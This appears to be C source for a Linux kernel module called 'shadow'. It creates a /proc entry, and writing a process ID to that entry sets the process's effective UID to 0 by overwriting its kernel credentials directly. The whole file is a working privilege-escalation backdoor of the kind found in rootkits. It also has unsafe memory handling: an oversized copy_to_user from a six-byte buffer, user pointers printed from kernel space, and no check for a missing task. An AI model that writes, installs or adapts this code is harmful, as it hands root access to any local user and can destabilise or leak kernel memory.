#include "kern_shadow.h"

static char msg[6];

static int __init
shadow_init(void)
{
	int ret;
	ret = create_new_proc_entry();
	/* msg = kmalloc(MAX_MSG_SIZE * sizeof(char), GFP_KERNEL); */
	if (ret < 0)
		return -1;
	return 0;
}

static void __exit
shadow_exit(void)
{
	remove_proc_entry(SHADOW_PROC_NAME, NULL);
}

module_init(shadow_init);
module_exit(shadow_exit);

static int
create_new_proc_entry(void)
{
	shadow_proc_dir = proc_create(SHADOW_PROC_NAME, S_IFREG | S_IRUSR | S_IWUSR, NULL, &shadow_proc_fops);
	if (!shadow_proc_dir)
	{
		remove_proc_entry(SHADOW_PROC_NAME, NULL);
		return -1;
	}
	return 0;
}

static ssize_t
shadow_proc_read(struct file *flip, char *buf, size_t buf_len, loff_t *offp)
{
	static int readed = 0; 
	if (readed)
	{
		readed = 0;
		return 0;
	}
	readed = 1;
	copy_to_user(buf, msg, buf_len);
	printk(KERN_INFO "buf: %s msg: %s buf_len: %ld bufstrlen: %ld msgstrlen %ld", buf, msg, buf_len, strlen(buf), strlen(msg));
	return strlen(buf);
}

static ssize_t
shadow_proc_write(struct file *filp, const char *buf, size_t buf_len, loff_t *offp)
{
	pid_t pid;
	/*static int writed = 0;
	int cop = 0;
	if (writed)
	{
		writed = 0;
		return strlen(buf);
	}	
	writed = 1;
	memset(msg, 0, MAX_MSG_SIZE);
	cop = strncpy_from_user(msg, buf, MAX_MSG_SIZE - 1);
	return cop;*/
	printk(KERN_INFO "strlen: %ld msg: %s buf: %s\n", strlen(msg), msg, buf);
	strncpy_from_user(msg, buf, 6);
	sscanf(msg, "%d", &pid);
	try_escalate_proc_priv(pid);
	return strlen(buf);
}

static void
try_escalate_proc_priv(pid_t pid)
{
	struct task_struct *task;
	struct cred *task_creds;
	rcu_read_lock(); 
	// task = find_task_by_vpid(pid);
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	task_creds = (struct cred *) rcu_dereference(task->cred);
	task_creds->euid.val = 0;
	rcu_read_unlock();
}